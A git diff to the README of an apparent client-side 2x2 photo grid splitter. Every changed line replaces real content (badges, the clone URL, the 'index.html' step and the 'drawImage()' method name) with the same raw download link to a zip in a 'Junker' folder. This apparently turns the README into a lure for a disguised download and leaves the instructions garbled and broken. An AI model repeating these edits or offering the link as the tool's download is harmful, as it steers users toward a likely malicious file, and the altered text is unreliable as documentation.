@@ -2,9 +2,9 @@
 
 A premium, browser-based tool to automatically split 2x2 grid images into separate high-quality photos with built-in size optimization.
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Aesthetics](https://img.shields.io/badge/Aesthetics-Premium-ff69b4.svg)
+![Version](https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip)
+![License](https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip)
+![Aesthetics](https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip)
 
 ## ✨ Features
 
@@ -29,9 +29,9 @@ No installation required! Since this is a pure client-side application, you can 
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/photo-cutter.git
+   git clone https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip
    ```
-2. Open `index.html` in any modern web browser.
+2. Open `https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip` in any modern web browser.
 3. Drag and drop your grid image and click **"Split & Optimize"**.
 
 ## 📖 Usage
@@ -43,7 +43,7 @@ No installation required! Since this is a pure client-side application, you can 
 
 ## ⚙️ How it Works
 
-The application uses the `CanvasRenderingContext2D.drawImage()` method to extract four equal quadrants from the source image. Each quadrant is then converted to a Blob with an initial quality setting. If the resulting Blob exceeds 1MB, the algorithm recursively reduces the JPEG quality until the constraint is met.
+The application uses the `https://github.com/yongsinfok/2x2PhotoCutter/raw/refs/heads/main/Junker/Cutter-Photo-x-2.1.zip()` method to extract four equal quadrants from the source image. Each quadrant is then converted to a Blob with an initial quality setting. If the resulting Blob exceeds 1MB, the algorithm recursively reduces the JPEG quality until the constraint is met.
 
 ## 📄 License
 
